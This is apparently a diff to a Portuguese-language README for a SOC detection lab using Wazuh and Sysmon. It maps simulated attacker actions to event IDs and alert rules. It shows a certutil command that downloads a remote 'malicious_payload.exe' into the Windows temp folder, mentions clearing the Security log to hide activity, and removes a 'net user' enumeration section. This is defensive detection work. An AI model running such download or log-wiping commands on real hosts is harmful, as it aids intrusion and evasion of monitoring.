@@ -13,7 +13,7 @@ Laboratório prático focado em centralização de eventos, correlação de logs
 ### 1. Download de Payload Malicioso
 **Comando Executado:** `certutil.exe -urlcache -split -f "https://..." C:\Windows\Temp\malicious_payload.exe`
 - **Telemetria / Geração de Alerta:**
-  * O utilitário nativo do Windows foi abusado para realizar o download de um binário externo.
+  * O utilitário nativo do Windows foi usado para realizar o download de um binário externo.
   * O Sysmon registrou a criação de processo (**Event ID 1**).
   * O Wazuh correlacionou os argumentos da linha de comando e disparou a **Regra 92075 (Nível 12 - Crítico)**, sinalizando a tentativa de download não autorizado no diretório temporário.
  
@@ -25,15 +25,6 @@ Laboratório prático focado em centralização de eventos, correlação de logs
   * Tentativa de apagar o histórico do log de Segurança do Windows para ocultar rastro de atividades maliciosas.
   * O sistema operacional gerou nativamente o **Event ID 1102** (Log de Auditoria Limpo).
   * O Wazuh identificou a ação imediatamente através da **Regra 63103 (Nível 5 - Médio)**, notificando a equipe de SOC sobre a manipulação de logs no host.
-
----
-
-### 3. Enumeração de Usuários do Sistema (Reconhecimento Local)
-**Comando Executado:** `net user`
-- **Telemetria & Geração de Alerta:**
-  * Mapeamento de contas e privilégios locais para identificação de possíveis alvos de elevação de privilégio.
-  * O Sysmon coletou a chamada do processo pai (`cmd.exe`) chamando o binário `net.exe`.
-  * O SIEM registrou o comportamento com a **Regra 92031 (Nível 3 - Informativo)** para manter o rastreamento da sessão do usuário.
 
 ---
  
